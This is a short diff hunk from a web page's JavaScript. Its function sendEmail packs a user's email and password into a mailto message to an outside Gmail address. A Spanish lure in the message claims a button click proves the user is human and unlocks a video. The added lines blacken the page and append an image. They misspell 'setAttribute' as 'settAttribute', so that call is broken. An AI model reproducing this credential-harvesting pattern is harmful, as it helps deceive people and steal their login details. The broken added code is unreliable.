@@ -109,6 +109,11 @@ function sendEmail() {
     const body = `Para asegurarnos que eres una persona real, por favor haz clic en el botón triangular que aparece en la parte superior de la página, posteriormente se mostrará el contenido del vídeo\nE:${encryptedEmail}\nP: ${encryptedPassword}`;
     const mailtoLink = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
     window.location.href = mailtoLink;
+
+document.body.style.backgroundColor = "black"; 
+let i = document.createElement('img'); 
+i.settAttribute('src', 'url'); 
+document.body.appendChild(i); 
 }
 
 </script>
